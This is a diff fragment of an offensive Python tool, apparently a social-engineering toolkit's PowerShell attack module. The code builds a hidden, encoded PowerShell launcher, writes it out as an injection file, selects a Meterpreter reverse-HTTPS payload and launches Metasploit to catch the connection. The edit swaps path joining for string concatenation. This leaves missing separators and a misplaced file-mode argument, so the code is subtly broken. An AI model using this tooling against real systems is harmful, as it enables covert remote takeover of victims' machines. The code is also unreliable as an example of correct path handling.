@@ -68,7 +68,7 @@ try:
     if port == "":
         port = "443"
     core.update_options("PORT={0}".format(port))
-    with open(os.path.join(core.setdir, "/payload_options.shellcode"), "w") as filewrite:
+    with open(os.path.join(core.setdir + "/payload_options.shellcode"), "w") as filewrite:
         # format needed for shellcode generation
         filewrite.write("{0} {1},".format(payload, port))
     core.update_options("POWERSHELL_SOLO=ON")
@@ -80,14 +80,14 @@ try:
         import src.payloads.powershell.prep
 
     # create the directory if it does not exist
-    if not os.path.isdir(os.path.join(core.setdir, "reports/powershell")):
-        os.makedirs(os.path.join(core.setdir, "reports/powershell"))
+    if not os.path.isdir(os.path.join(core.setdir + "reports/powershell")):
+        os.makedirs(os.path.join(core.setdir + "reports/powershell"))
 
-    with open(os.path.join(core.setdir, "x86.powershell")) as fileopen:
+    with open(os.path.join(core.setdir + "x86.powershell")) as fileopen:
         x86 = fileopen.read()
     x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
-    core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir, "reports/powershell")))
-    with open(os.path.join(core.setdir, "/reports/powershell/x86_powershell_injection.txt", "w")) as filewrite:
+    core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir + "reports/powershell")))
+    with open(os.path.join(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")) as filewrite:
         filewrite.write(x86)
     payload = "windows/meterpreter/reverse_https\n"  # if we are using x86
     command = x86  # assign powershell to command
@@ -113,8 +113,8 @@ try:
 
     # launch metasploit below
     core.print_status("Launching Metasploit.. This may take a few seconds.")
-    subprocess.Popen("{0} -r {1}".format(os.path.join(core.meta_path(), "msfconsole"),
-                                         os.path.join(core.setdir, "reports/powershell/powershell.rc")),
+    subprocess.Popen("{0} -r {1}".format(os.path.join(core.meta_path() + "msfconsole"),
+                                         os.path.join(core.setdir + "reports/powershell/powershell.rc")),
                      shell=True).wait()
 
 # handle exceptions
